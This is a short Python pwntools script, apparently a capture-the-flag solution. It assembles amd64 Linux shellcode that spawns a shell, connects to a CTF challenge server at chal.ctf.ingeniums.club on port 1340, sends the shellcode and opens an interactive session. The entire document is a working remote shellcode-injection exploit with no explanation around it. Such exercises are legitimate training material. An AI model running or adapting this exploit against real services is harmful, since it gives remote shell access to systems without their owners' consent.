from pwn import *

shellcode = asm(shellcraft.amd64.linux.sh(), arch="x86_64")

io = remote('chal.ctf.ingeniums.club', 1340)

io.sendline(shellcode )

io.interactive()

